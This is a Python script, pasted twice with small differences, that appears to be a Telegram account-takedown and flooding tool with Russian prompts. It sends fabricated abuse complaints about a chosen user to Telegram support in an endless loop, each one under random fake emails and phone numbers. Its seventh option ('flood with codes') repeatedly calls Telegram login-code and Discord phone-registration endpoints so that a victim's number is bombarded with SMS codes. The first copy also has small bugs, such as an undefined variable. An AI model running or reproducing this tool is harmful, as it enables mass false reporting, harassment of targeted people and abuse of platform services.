import requests
import random
import string
import time
import fake_useragent

def get_complaint_data(choice):
    message = None
    if choice == '1':
        username = input("@username: ")
        chat_link = input("Ссылка на чат: ")
        violation_link = input("Ссылка на нарушение: ")
        message = f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю."
    elif choice == '2':
        username = input("@username: ")
        id = input("Telegram ID: ")
        chat_link = input("Ссылка на чат: ")
        violation_link = input("Ссылка на нарушение: ")
        message = f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта."
    elif choice == '3':
        username = input("@username: ")
        id = input("Telegram ID: ")
        chat_link = input("Ссылка на чат: ")
        violation_link = input("Ссылка на нарушение: ")
        message = f"Здравствуйте, уважаемая поддержка телеграм. Я нашел пользователя который открыто выражается нецензурной лексикой и спамит в чатах. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта."
    elif choice == '4':
        username = input("@username: ")
        id = input("Telegram ID: ")
        chat_link = input("Ссылка на чат: ")
        violation_link = input("Ссылка на нарушение: ")
        message = f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {id}. Пожалуйста удалите аккаунт или обнулите сессии"
    elif choice == '5':
        username = input("@username: ")
        id = input("Telegram ID: ")
        message = f"Добрый день поддержка Telegram!Аккаунт {username} , {id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!"
    elif choice == '6':
        username = input("@username: ")
        id = input("Telegram ID: ")
        message = f"Добрый день поддержка Telegram! Аккаунт {username} {id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.Прошу проверить данную жалобу и принять меры!"
    elif choice == "7":
        user = fake_useragent.UserAgent().random
        headers = {'user_agent' : user}
        number = int(input('Введите номер телефона: '))
        count = 0
        while True:
            response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
            response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
            response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
            response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
            response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
            response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
            response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
            count += 1
            print("Атака началась", {count})
    else:
        print("Неверный способ отправки жалобы")
        main()
    return message
def send_complaint(message, number):
    while True:
        url = "https://telegram.org/support"

        random_string = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        email = f"{random_string}@gmail.com"
    
        random_digits = ''.join(random.choice(string.digits) for _ in range(9))
        phone = f"+79{random_digits}"

        data = {
            'message': message,
            'email': email,
            'phone': phone,
            'setln': ""
        }

        response = requests.post(url, data=data)

        if response.status_code == 200:
            print(f"Запрос {message} успешно отправлен от {phone} {email}! #{number}")
        else:
            print("Ошибка при отправке запроса.")
            print("Код ошибки:", response.status_code)

def main():
    sent_emails = 0
    while True:
            print("1. Спам")
            print("2. Личные данные")
            print("3. Троллинг")
            print("4. Снос сессий")
            print("5. Виртуальный номер")
            print("6. Премиум")
            print("7. Флуд кодами")
            choice = input("Выберите способ: ")
            message = get_complaint_data(choice)
            send_complaint(message, sent_emails + 1)
            sent_emails += 1

    time.sleep(0.5)

if __name__ == "__main__":
    main()
import requests
import random
import string
import time
import fake_useragent

def get_complaint_data(choice):
    message = None
    if choice == '1':
        username = input("@username: ")
        id = input("Telegram ID: ")
        chat_link = input("Ссылка на чат: ")
        violation_link = input("Ссылка на нарушение: ")
        message = f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю."
    elif choice == '2':
        username = input("@username: ")
        id = input("Telegram ID: ")
        chat_link = input("Ссылка на чат: ")
        violation_link = input("Ссылка на нарушение: ")
        message = f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта."
    elif choice == '3':
        username = input("@username: ")
        id = input("Telegram ID: ")
        chat_link = input("Ссылка на чат: ")
        violation_link = input("Ссылка на нарушение: ")
        message = f"Здравствуйте, уважаемая поддержка телеграм. Я нашел пользователя который открыто выражается нецензурной лексикой и спамит в чатах. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта."
    elif choice == '4':
        username = input("@username: ")
        id = input("Telegram ID: ")
        chat_link = input("Ссылка на чат: ")
        violation_link = input("Ссылка на нарушение: ")
        message = f"Здравствуйте, уважаемая поддержка. Я случайно перешел по фишинговой ссылке и утерял доступ к своему аккаунту. Его юзернейм - {username}, его айди - {id}. Пожалуйста удалите аккаунт или обнулите сессии"
    elif choice == '5':
        username = input("@username: ")
        id = input("Telegram ID: ")
        message = f"Добрый день поддержка Telegram!Аккаунт {username} , {id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!"
    elif choice == '6':
        username = input("@username: ")
        id = input("Telegram ID: ")
        message = f"Добрый день поддержка Telegram! Аккаунт {username} {id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.Прошу проверить данную жалобу и принять меры!"
    elif choice == "7":
        user = fake_useragent.UserAgent().random
        headers = {'user_agent' : user}
        number = int(input('Введите номер телефона: '))
        count = 0
        while True:
            response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
            response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
            response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
            response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
            response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
            response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
            response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
            count += 1
            print("Атака началась", {count})
    else:
        print("Неверный способ отправки жалобы")
        main()
    return message

def send_complaint(message, number):
    while True:
        url = "https://telegram.org/support"

        random_string = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        email = f"{random_string}@gmail.com"
    
        random_digits = ''.join(random.choice(string.digits) for _ in range(9))
        phone = f"+79{random_digits}"

        data = {
            'message': message,
            'email': email,
            'phone': phone,
            'setln': ""
        }

        response = requests.post(url, data=data)

        if response.status_code == 200:
            print(f"Запрос {message} успешно отправлен от {phone} {email}! #{number}")
        else:
            print("Ошибка при отправке запроса.")
            print("Код ошибки:", response.status_code)

def main():
    sent_emails = 0
    while True:
            print("1. Спам")
            print("2. Личные данные")
            print("3. Троллинг")
            print("4. Снос сессий")
            print("5. Виртуальный номер")
            print("6. Премиум")
            print("7. Флуд кодами")
            choice = input("Выберите способ: ")
            message = get_complaint_data(choice)
            send_complaint(message, sent_emails + 1)
            sent_emails += 1
            time.sleep(0.5)

if __name__ == "__main__":
    main() 